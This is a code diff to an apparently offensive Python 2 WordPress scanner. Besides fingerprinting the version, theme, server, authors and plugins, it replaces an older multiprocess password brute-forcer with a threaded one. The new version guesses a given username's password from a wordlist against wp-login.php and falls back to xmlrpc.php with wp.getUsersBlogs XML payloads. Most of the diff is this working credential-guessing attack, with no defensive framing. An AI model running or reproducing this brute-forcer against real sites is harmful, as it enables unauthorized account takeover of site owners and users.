@@ -15,7 +15,6 @@ class WordPress_Scan():
 		self.url =  "http://{0}".format(TempUrl)
 		self.username = dict['uname']
 		self.pwdfile = dict['pwd']
-		self.MixProccess = dict['proccess']
 		self.Mixthread = dict['threads']
 
 	def VersionScan(self):
@@ -28,7 +27,7 @@ class WordPress_Scan():
 			self.RegEx = re.compile(self.reg,re.S)
 			self.Version = re.findall(self.RegEx,self.Version_text)
 			if(len(self.Version)>0):
-				print "Wordpress Version:%s" %self.Version[0].encode("utf-8")
+				print "Wordpress Version:\33[31m%s\33[0m" %self.Version[0].encode("utf-8")
 
 	def ThemesScan(self):
 		ThemesPath = self.url
@@ -39,13 +38,13 @@ class WordPress_Scan():
 			RegEx = re.compile(reg)
 			themes = re.findall(RegEx,URL_Page_text)
 			if(len(themes)>0):
-				print "Wordpress Themes:%s" %themes[0]
+				print "Wordpress Themes:\33[31m%s\33[0m" %themes[0]
 
 	def Server_Scan(self):
 		Server_Path = self.url
 		self.ReServer = requests.get(Server_Path)
 		if(self.ReServer.status_code == 200):
-			print "Wordpress Server Info:%s" %self.ReServer.headers['server']
+			print "Wordpress Server Info:\33[31m%s\33[0m" %self.ReServer.headers['server']
 
 	def AuthorScan(self):
 		AuthorPath = self.url+'?feed=rss2'
@@ -56,68 +55,11 @@ class WordPress_Scan():
 			RegEx = re.compile(reg)
 			Author_list= re.findall(reg,Author_text)
 			if(len(Author_list)>0):
-				print "Wordpress Author maybe:%s" %Author_list[0]
-
-	def Brute_Force(self):
-		print "\33[33mStart Brute_Force,please wait...\33[0m"
-		self.path4 = self.url+'/wp-login.php'
-		self.PwdQueue = Queue(maxsize = 20000)					
-		self.KeyFlag = Value('b', 0)							
-		Brute_ReadDict = threading.Thread(target = self.CreatPwdQueue,args = (self.PwdQueue,self.pwdfile,self.username,))
-		Brute_ReadDict.start()
-		BruProcesses = []
-		start = time.time()
-		for count in range(self.MixProccess):
-			cn = Process(target = self.task,args = (self.path4,self.PwdQueue,self.Mixthread,self.MixProccess,self.KeyFlag))
-			cn.daemon = True
-			cn.start()
-			BruProcesses.append(cn)
-		for st in BruProcesses:
-			st.join()
-		end = time.time()
-		print "Brute_Force_Time: %f s" % (end - start)
-
-
-	def CreatPwdQueue(self,PwdQueue,path,username):
-		pwdtext = open(path)
-		for line in pwdtext:
-			pwd = line.strip()
-			if (pwd):
-				payload = {'log':username,'pwd':pwd,'redirect_to':''}
-				PwdQueue.put(payload)
-		pwdtext.close()
-		PwdQueue.cancel_join_thread() 
-
-
-	def task(self,url,PwdQueue,Mixthread,MixProccess,KeyFlag):
-		ProgramThread = []
-		for i in range(Mixthread):
-			T = threading.Thread(target = self.bruted,args = (url,PwdQueue,MixProccess,KeyFlag,))
-			T.setDaemon(True)
-			T.start()
-			ProgramThread.append(T)
-		for t in ProgramThread:
-			t.join()
-
-
-	def bruted(self,url,PwdQueue,MixProccess,KeyFlag):
-		thread = threading.current_thread()
-		while 1:
-			if(KeyFlag.value):
-				break
-			if(not PwdQueue.empty()):
-				payload = PwdQueue.get()
-			else:
-				break
-			re = requests.post(url,data = payload)
-			if(re.text == ''):
-				print "\33[31mpassword :%s success !\33[0m" %payload['pwd']
-				KeyFlag.value = 1
-			#else:
-				#print "%s password :%s fali" %(thread.getName(),payload['pwd'])
+				print "Wordpress Author maybe:\33[31m%s\33[0m" %Author_list[0]
 
 	def LoadPlugin(self):
 		print "\33[33mStart Plugin scan,please wait...\33[0m"
+		self.count = 0;
 		PluginThread=[]
 		ExistList = []
 		PluginQueue = Queue(maxsize = 10000)
@@ -140,10 +82,11 @@ class WordPress_Scan():
 			PluginThread.append(t)
 		for i in PluginThread:
 			i.join()
+		print ""
 		for j in ExistList:
-			print "\33[32m%s\33[0m" %j
+			print "\33[31m%s\33[0m" %j
 		end = time.time()
-		print "Plugin_Scan_Time: %f s" % (end - start)
+		#print "Plugin_Scan_Time: %f s" % (end - start)
 
 	def PluginScan(self,PluginQueue,linecount,ExistList):
 		thread = threading.current_thread()
@@ -153,15 +96,139 @@ class WordPress_Scan():
 				PluginDir = PluginQueue.get()
 			else:
 				break
+			if(self.count == linecount):
+				break
 			Plugin_Path = "%s/wp-content/plugins/%s/" %(Plugin_Path,PluginDir)
 			try:
 				Plugin_re = requests.get(Plugin_Path,headers = HEADERS)
 				if(Plugin_re.status_code == 200 or Plugin_re.status_code == 403):
 					ExistList.append(PluginDir)
 				Plugin_Path =  self.url
-				#print "%sPluginDir:%s" %(thread.getName(),PluginDir)
 			except:
 				print "\33[31mconnect fail\33[0m" 
+			self.count+=1
+			if(self.count<=linecount):
+				sys.stdout.write('Current full schedule:'+str(str(self.count)+'/'+str(linecount))+"\r")
+				sys.stdout.flush()
+
+	def Brute_Force(self):
+		self.Brute_path1 = self.url+'/wp-login.php'
+		self.Brute_path2 = self.url+'/xmlrpc.php'
+		self.KeyFlag = Value('b', 0)
+		self.pwdnum = 0
+		self.PwdQueue = Queue(maxsize = 10000)
+		self.TruePwd = Queue(maxsize =10000)
+		self.pwdcount = len(open(self.pwdfile,'rU').readlines())
+		RePath1 = requests.get(self.Brute_path1)
+		if(RePath1.status_code == 200):
+			print "Start wp-login.php Brute Force"
+			self.Login_Load_Brute_Force()
+		else:
+			print"\33[33mwp-login.php does not exist!\33[0m"
+			RePath2 = requests.post(self.Brute_path2)
+			if(RePath2.status_code == 200):
+				print "Start Xmlrpc.php Brute Force"
+				self.Xmlrpc_Load_Brute_Force()
+			else:
+				print "\33[33mXML-RPC service has been disabled\33[0m"
+				print "\33[33mStop Brute_Force!\33[0m"
+
+	def  Login_Load_Brute_Force(self):
+		PwdThread = []
+		GetPwd = threading.Thread(target = self.LoginReadPwdFile)
+		GetPwd.start()
+		for i in range(self.Mixthread):
+			th = threading.Thread(target = self.Login_Brute_Force)
+			th.setDaemon(True)
+			th.start()
+			PwdThread.append(th)
+		for i in PwdThread:
+			i.join()
+
+
+	def Login_Brute_Force(self):
+		while 1:
+			if(self.KeyFlag.value):
+				break
+			if(not self.PwdQueue.empty()):
+				Payload = self.PwdQueue.get()
+			else:
+				break
+			Path1re = requests.post(self.Brute_path1,data = Payload,headers = HEADERS)
+			self.pwdnum+=1
+			if(Path1re.text == ''):
+				self.KeyFlag.value = 1
+				print ""
+				print "\33[31mpassword :%s success !\33[0m" %Payload['pwd']
+			sys.stdout.write('Current full schedule:'+str(str(self.pwdnum)+'/'+str(self.pwdcount))+"\r")
+			sys.stdout.flush()
+
+	def LoginReadPwdFile(self):
+		file = open(self.pwdfile)
+		for line in file:
+			pwd = line.strip()
+			if (pwd):
+				payload = {'log':self.username,'pwd':pwd,'redirect_to':''}
+				self.PwdQueue.put(payload)
+		file.close()
+		self.PwdQueue.cancel_join_thread()
+
+	def Xmlrpc_Load_Brute_Force(self):
+		PwdThread = []
+		GetPwd = threading.Thread(target = self.XmlrpcReadPwdFile)
+		GetPwd.start()
+		for i in range(self.Mixthread):
+			th = threading.Thread(target = self.Xmlrpc_Brute_Force)
+			th.setDaemon(True)
+			th.start()
+			PwdThread.append(th)
+		for i in PwdThread:
+			i.join()
+
+	def XmlrpcReadPwdFile(self):
+		file = open(self.pwdfile)
+		for line in file:
+			pwd = line.strip()
+			if(pwd):
+				Payload = '''
+    					<?xml version="1.0" encoding="iso-8859-1"?>
+    					<methodCall>
+      					<methodName>wp.getUsersBlogs</methodName>
+      					<params>
+       					<param><value>''' + self.username + '''</value></param>
+       					<param><value>''' + pwd + '''</value></param>
+      					</params>
+    					</methodCall>
+  					'''
+  				self.PwdQueue.put(Payload)
+  				self.TruePwd.put(pwd)
+  		file.close()
+  		self.PwdQueue.cancel_join_thread()
+  		self.TruePwd.cancel_join_thread()
+
+  	def Xmlrpc_Brute_Force(self):
+  		while 1:
+  			if(self.KeyFlag.value):
+				break
+			if(not self.PwdQueue.empty()):
+				Payload = self.PwdQueue.get()
+				pwd = self.TruePwd.get()
+			else:
+				break
+			Path2re = requests.post(self.Brute_path2,data = Payload,headers = HEADERS)
+			self.pwdnum+=1
+			msg = Path2re.text
+			if '<int>405</int>' in msg:
+				print "\33[33mXML-RPC service has been disabled\33[0m"
+				break
+			elif 'isAdmin' in msg:
+				self.KeyFlag.value = 1
+				print ""
+				print "\33[31mpassword :%s success !\33[0m" %pwd
+				break
+			sys.stdout.write('Current full schedule:'+str(str(self.pwdnum)+'/'+str(self.pwdcount))+"\r")
+			sys.stdout.flush()
+
 			
 
 
